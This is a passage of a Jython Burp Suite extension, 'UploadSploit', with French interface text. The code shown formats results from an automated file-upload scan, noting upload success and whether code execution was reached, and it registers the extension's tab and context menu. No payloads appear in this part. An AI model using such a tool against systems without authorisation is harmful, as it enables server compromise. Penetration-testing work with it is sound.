        lines.append("Resultats du scan automatique :")
        displayAll = self.verboseCheckbox.isSelected()
        for tmplName, name, newName, status, uploaded, codeExec, codeUrl in results:
            if not displayAll and not codeExec:
                continue
            extra = ""
            if codeUrl:
                extra = " | url=%s" % codeUrl
            lines.append("- template=%s, variante=%s => %s | HTTP %s | upload=%s | codeExec=%s%s" % (tmplName, name, newName, status, uploaded, codeExec, extra))
        text = "\n".join(lines)

        def updateInfo():
            self.infoArea.setText(text)
            self.progressLabel.setText("Termine : %d / %d" % (attemptIndex, totalAttempts))
            self.progressLabel.setForeground(Color.BLACK)
        SwingUtilities.invokeLater(updateInfo)
        self.scanWorkerRunning = False


class UploadSploitScanWorker(Runnable):
    def __init__(self, tab):
        self.tab = tab

    def run(self):
        try:
            self.tab._doAutomaticScan()
        except Exception as e:
            self.tab.log("[UploadSploit] Erreur pendant le scan auto: %s" % e)


class BurpExtender(IBurpExtender, IContextMenuFactory):
    def registerExtenderCallbacks(self, callbacks):
        self.callbacks = callbacks
        self.helpers = callbacks.getHelpers()
        callbacks.setExtensionName("UploadSploit")
        collabCtx = None
        try:
            collabCtx = callbacks.createBurpCollaboratorClientContext()
        except:
            collabCtx = None
        self.tab = UploadSploitTab(callbacks, self.helpers, collabCtx)
        callbacks.addSuiteTab(self.tab)
        callbacks.registerContextMenuFactory(self)
        callbacks.printOutput("[UploadSploit] Extension chargée.")

    def createMenuItems(self, invocation):
        items = ArrayList()
        item = JMenuItem("Envoyer vers UploadSploit", actionPerformed=lambda e: self._handleInvocation(invocation))
        items.add(item)
        return items

    def _handleInvocation(self, invocation):
        messages = invocation.getSelectedMessages()
        if not messages or len(messages) == 0:
            self.callbacks.printError("[UploadSploit] Aucune requête sélectionnée dans le contexte.")
            return
        messageInfo = messages[0]
        self.callbacks.printOutput("[UploadSploit] Requête reçue depuis le menu contextuel.")
        def updateTab():
            self.tab.setRequestResponse(messageInfo)
            self.callbacks.printOutput("[UploadSploit] Onglet mis à jour avec la requête sélectionnée.")
        SwingUtilities.invokeLater(updateTab)


